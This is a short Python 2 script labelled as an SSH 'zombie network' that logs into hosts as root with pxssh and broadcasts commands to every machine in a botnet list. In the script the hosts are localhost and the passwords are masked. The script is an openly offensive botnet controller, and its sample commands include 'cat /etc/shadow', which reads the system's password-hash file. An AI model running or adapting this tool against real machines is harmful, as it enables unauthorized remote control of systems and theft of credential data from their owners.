#!/usr/bin/env python
#encoding=utf-8
#ssh僵死网络 by daige

import optparse
import pxssh

class Client:

    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception,e:
            print e
            print '[-] Error Connecting'

    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
    
def botnet_command(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from '+ client.host
        print '[+] '+ output + '\n'

def addClient(host,user,password):
    client=Client(host,user,password)
    botNet.append(client)


botNet = []

addClient('127.0.0.1','root','*******')
addClient('127.0.0.1','root','*******')

botnet_command('uname -v')
botnet_command('cat /etc/shadow')
